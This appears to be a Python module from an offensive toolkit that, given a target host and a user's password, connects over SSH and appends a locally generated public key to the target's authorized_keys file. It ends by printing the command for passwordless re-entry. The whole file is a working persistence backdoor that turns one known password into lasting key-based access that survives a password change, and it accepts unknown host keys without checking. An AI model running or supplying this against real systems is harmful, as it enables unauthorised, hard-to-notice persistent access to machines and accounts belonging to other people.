import paramiko
import os
import sys  # Import sys to handle exit
import time  # Import time for adding delays

# Function to generate an SSH key pair if it doesn't already exist
def generate_ssh_key_pair(key_name="id_rsa"):
    if not os.path.exists(key_name) or not os.path.exists(f"{key_name}.pub"):
        print("[+] Generating SSH key pair...")
        os.system(f'ssh-keygen -t rsa -b 2048 -f {key_name} -q -N ""')
        print(f"[+] SSH key pair generated: {key_name} and {key_name}.pub")
    else:
        print(f"[+] SSH key pair already exists: {key_name} and {key_name}.pub")

# Function to inject the public SSH key into the target's authorized_keys file
def inject_ssh_key(client, public_key_path):
    try:
        # Read the public key
        with open(public_key_path, 'r') as pubkey_file:
            public_key = pubkey_file.read().strip()

        # Ensure the .ssh directory exists and has the correct permissions
        stdin, stdout, stderr = client.exec_command('mkdir -p ~/.ssh && chmod 700 ~/.ssh')
        stdout.channel.recv_exit_status()

        # Inject the public key into the authorized_keys file
        inject_command = f'echo "{public_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        stdin, stdout, stderr = client.exec_command(inject_command)
        stdout.channel.recv_exit_status()

        print("[+] Public key injected into ~/.ssh/authorized_keys")
    except Exception as e:
        print(f"[!] Error during key injection: {e}")

# Main function to handle the SSH key injection process
def main():
    print("Starting SSH Key Injection...")
    
    ssh_host = input("Enter the target host IP: ")
    ssh_user = input("Enter the target username: ")
    ssh_password = input("Enter the target user's password: ")

    key_name = "id_rsa"
    generate_ssh_key_pair(key_name)

    try:
        # Establish SSH connection to the target
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ssh_host, username=ssh_user, password=ssh_password)
        
        # Inject the public key
        public_key_path = f"{key_name}.pub"
        inject_ssh_key(client, public_key_path)

        # Close the SSH connection
        client.close()
        
        print("\n[+] SSH Key Injection complete. You can now log in using your private key:")
        print(f"    ssh -i {key_name} {ssh_user}@{ssh_host}")

    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        if client:
            client.close()

    time.sleep(2)  # Adding delay to observe the output
    end_or_return()  # Call the function to ask the user what to do next

def end_or_return():
    choice = input("\n[1] Return to Main Menu\n[0] Exit\nSelect an option: ")
    if choice == '1':
        from main import main_menu  # Import the main_menu function from main.py
        main_menu()
    elif choice == '0':
        sys.exit()
    else:
        print("[!] Invalid selection.")
        end_or_return()

if __name__ == "__main__":
    main()
